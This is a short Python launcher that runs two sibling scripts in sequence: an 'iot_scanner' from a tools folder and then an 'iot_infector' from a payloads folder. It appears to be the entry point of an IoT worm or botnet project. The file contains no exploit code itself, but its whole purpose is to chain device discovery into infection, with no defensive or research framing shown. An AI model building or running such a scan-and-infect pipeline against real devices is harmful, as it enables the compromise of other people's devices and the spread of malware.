import subprocess
import os

def main():
    # Run the IoT scanner
    scanner_path = os.path.join(os.path.dirname(__file__), "tools", "iot_scanner.py")
    subprocess.run(["python3", scanner_path])

    # Run the IoT infector
    infector_path = os.path.join(os.path.dirname(__file__), "payloads", "iot_infector.py")
    subprocess.run(["python3", infector_path])

if __name__ == "__main__":
    main()
